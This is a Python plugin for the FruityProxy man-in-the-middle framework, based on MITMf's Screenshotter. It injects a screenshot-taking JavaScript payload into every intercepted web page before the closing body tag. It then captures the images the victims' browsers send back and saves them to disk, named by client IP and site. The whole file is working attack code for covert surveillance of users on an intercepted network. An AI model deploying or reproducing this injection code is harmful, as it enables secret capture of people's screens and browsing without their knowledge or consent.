#!/usr/bin/env python

# Copyright (C) 2015 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

from plugins.plugin import Plugin
from libmproxy.protocol.http import decoded

import logging
logger = logging.getLogger("fruityproxy")

import base64
import urllib
import re
from datetime import datetime

'''
Based on MITMf Screenshotter plugin: https://github.com/byt3bl33d3r/MITMf/
'''

class Screenshot(Plugin):
    name = 'Screenshot'
    version = "1.0"
    replace_str = "</body>"
    content_path = "./content/Screenshot/screenshot.js"
    interval = 10
    
    def request(self, flow):
        
        if 'saveshot' in flow.request.path:
            flow.request.printPostData = False
            #client = flow.request.client.getClientIP()
            client = flow.client_conn.address()[0]
            img_file = '{}-{}-{}.png'.format(client, flow.request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
            try:
                with open('./logs/' + img_file, 'wb') as img:
                    img.write(base64.b64decode(urllib.unquote(flow.request.content).decode('utf8').split(',')[1]))
                    img.close()

                logger.debug('[ScreenShotter] {} Saved screenshot to {}'.format(client, img_file))
            except Exception as e:
                logger.debug('[ScreenShotter] {} Error saving screenshot: {}'.format(client, e))        
        
    def response(self, flow):
        with decoded(flow.response):
            
            canvas = re.sub("SECONDS_GO_HERE", str(self.interval*1000), open(self.content_path, "rb").read())
            flow.response.content = flow.response.content.replace(self.replace_str, '<script type="text/javascript">' + canvas + '</script>' + self.replace_str)
            